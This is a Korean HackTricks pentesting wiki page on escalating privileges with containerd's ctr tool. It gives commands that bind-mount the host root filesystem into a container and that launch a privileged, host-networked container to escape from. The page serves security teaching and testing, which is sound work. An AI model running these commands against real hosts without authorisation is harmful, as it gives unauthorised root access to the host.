# Containerd (ctr) 권한 상승

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

다음 링크에서 **containerd와 `ctr`가 컨테이너 스택에서 어떤 위치에 있는지** 알아보세요:


{{#ref}}
container-security/runtimes-and-engines.md
{{#endref}}

## PE 1

호스트에 `ctr` 명령이 있는 것을 발견했다면:
```bash
which ctr
/usr/bin/ctr
```
이미지를 나열할 수 있습니다:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
그런 다음 **호스트 루트 폴더를 해당 이미지에 마운트하여 그 이미지 중 하나를 실행합니다**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

privileged container를 실행하고 탈출합니다.\
privileged container는 다음과 같이 실행할 수 있습니다:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
그런 다음 다음 페이지에 언급된 일부 기법을 사용하여 **privileged capabilities를 악용해 escape할 수 있습니다**:


{{#ref}}
container-security/
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
